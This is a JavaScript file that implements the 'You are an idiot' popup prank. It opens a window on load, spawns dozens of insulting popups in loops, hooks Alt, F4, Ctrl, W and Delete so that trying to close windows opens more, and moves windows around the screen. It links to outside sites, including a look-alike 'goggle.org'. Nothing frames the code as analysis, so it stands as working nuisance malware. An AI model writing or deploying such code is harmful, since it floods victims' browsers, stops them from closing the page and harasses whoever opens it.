function bookmark() {
    if ((navigator.appName == "Google chrome") 
    && (parseInt(navigator.appVersion) >= 11)) 
    {
    var url="lol.html";
    var title="Idiot!";
    window.external.AddFavorite(url,title);
    }
    }

    var xOff = 5;
    var yOff = 5;
    var xPos = 400;
    var yPos = -100;
    var flagRun = 1;

function changeTitle(title) {
document.title = title;
openWindow("idiot.html")
}

function openWindow(url) {
aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}
function openWindowa(url) {
    aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
    }


function procreate() {
changeTitle("Idiot!");
openWindowa("http://youareanidiot.cc/lol.html")
for (var i = 0; i < 6; i++) {
    
    
    openWindow('https://theaviary.me/Idiot!/Converted/lol.html')
}
}

function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("You are an idiot!"); procreate(); } }
function ctrlwkey() { if (event.keyCode == 17 || event.keyCode == 87) { alert("You are an idiot!"); procreate(); } }
function delkey() { if (event.keyCode == 46) { alert("You are an idiot!"); procreate(); } }
window.open("https://theaviary.me/Idiot!/Converted/lol.html")
function myFunction() {
    for (i = 0; i < 69; i++) {
        openWindowa("http://youareanidiot.cc/lol.html")
        procreate()

    }

}
function myFunction2() {
    for (i = 0; i < 69; i++) {
        openWindow("http://youareanidiot.cc/lol.html")
        procreate()

    }

}

function newXlt(){
xOff = Math.ceil(-8 * Math.random()) * 5 - 7 ;
window.focus()
window.open("http://youareanidiot.cc/lol.html")
}
function newXrt(){
xOff = Math.ceil(7 * Math.random())  * 5 - 15 ;
openWindow("http://youareanidiot.cc/lol.html")
}

function newYup(){
yOff = Math.ceil(-6 * Math.random())  * 5 - 56 ;
openWindow("https://theaviary.me/Idiot!/Converted/lol.html")
}

function newYdn(){
yOff = Math.ceil( 8 * Math.random())  * 5 - 13  ;
openWindow("http://youareanidiot.cc")
}

function fOff(){
flagrun = 0;
openWindow("http://goggle.org")
}

function playBall() {
xPos += xOff;
yPos += yOff;

if (xPos > screen.width - 397) {
    newXlt();
}

if (xPos < 0){
    newXrt();
}

if (yPos > screen.height - 318) {
    newYup();
}   
    
if (yPos < 0){
    newYdn();
}

if (flagRun == 1){
    window.moveTo(xPos, yPos);
    setTimeout('playBall()', 1);
}
}